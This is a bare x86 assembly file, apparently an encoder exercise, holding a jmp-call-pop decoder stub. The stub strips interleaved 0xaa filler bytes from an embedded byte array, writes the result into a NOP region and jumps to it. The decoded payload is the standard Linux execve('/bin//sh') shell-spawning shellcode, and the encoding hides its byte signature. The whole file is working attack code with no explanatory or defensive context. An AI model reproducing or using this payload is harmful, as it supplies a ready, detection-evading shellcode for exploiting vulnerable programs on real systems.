global main

section .text 

main:
    jmp short decoder

decode:
    pop esi 
    
    jmp short temp2

main_decoder:
    pop edi
    xor ecx,ecx 
    mov cl,25
    xor eax,eax
    xor ebx,ebx

decoding:
    mov bl,[esi+eax]
    mov byte [edi],bl
    inc al
    inc al 
    inc edi
    loop decoding
    jmp short dest

decoder:
    call decode
    shellcode: db 0x31,0xaa,0xc0,0xaa,0x50,0xaa,0x68,0xaa,0x2f,0xaa,0x2f,0xaa,0x73,0xaa,0x68,0xaa,0x68,0xaa,0x2f,0xaa,0x62,0xaa,0x69,0xaa,0x6e,0xaa,0x89,0xaa,0xe3,0xaa,0x50,0xaa,0x89,0xaa,0xe2,0xaa,0x53,0xaa,0x89,0xaa,0xe1,0xaa,0xb0,0xaa,0x0b,0xaa,0xcd,0xaa,0x80,0xaa

temp2: 
call  main_decoder
dest: db 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90


